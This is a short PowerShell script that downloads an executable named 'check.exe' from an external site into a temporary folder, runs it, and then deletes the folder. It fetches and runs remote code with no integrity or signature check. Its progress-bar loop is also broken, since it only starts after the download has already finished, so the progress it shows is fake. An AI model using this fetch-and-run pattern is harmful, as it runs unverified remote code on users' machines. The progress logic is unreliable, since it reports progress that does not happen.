# Create a temporary directory
$tempPath = Join-Path $env:TEMP ([System.Guid]::NewGuid().ToString())
New-Item -ItemType Directory -Path $tempPath -Force | Out-Null

try {
    # Download URL
    $url = "https://liforra.de/check.exe"
    $outFile = Join-Path $tempPath "check.exe"

    # Download the file with progress bar
    $ProgressPreference = 'Continue'
    $response = Invoke-WebRequest -Uri $url -OutFile $outFile -PassThru
    $totalLength = $response.Headers.'Content-Length'[0]
    
    Write-Progress -Activity "Downloading check.exe" -Status "0% Complete" -PercentComplete 0
    $reader = [System.IO.File]::OpenRead($outFile)
    while (($downloaded = $reader.Length) -lt $totalLength) {
        $percent = $downloaded * 100 / $totalLength
        Write-Progress -Activity "Downloading check.exe" -Status "$([Math]::Round($percent,2))% Complete" -PercentComplete $percent
        Start-Sleep -Milliseconds 200
    }
    $reader.Close()
    Write-Progress -Activity "Downloading check.exe" -Status "100% Complete" -PercentComplete 100 -Completed

    # Execute the file
    Start-Process -FilePath $outFile -WorkingDirectory $tempPath -Wait

} catch {
    Write-Error "An error occurred: $_"
} finally {
    # Cleanup: Remove temporary directory and its contents
    Remove-Item -Path $tempPath -Recurse -Force -ErrorAction SilentlyContinue
}